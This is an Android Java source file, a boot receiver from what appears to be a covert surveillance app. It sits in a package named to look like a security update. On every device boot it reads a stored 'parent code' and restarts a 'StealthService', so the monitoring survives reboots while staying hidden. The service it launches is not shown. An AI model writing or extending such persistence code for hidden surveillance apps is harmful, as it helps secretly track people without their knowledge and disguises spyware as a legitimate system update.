package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("BootReceiver", "Device booted - Starting stealth service");
        
        SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
        String parentCode = prefs.getString("parent_code", "");
        
        if (!parentCode.isEmpty()) {
            // Start stealth service on boot
            Intent serviceIntent = new Intent(context, StealthService.class);
            serviceIntent.putExtra("PARENT_CODE", parentCode);
            context.startService(serviceIntent);
        }
    }
}
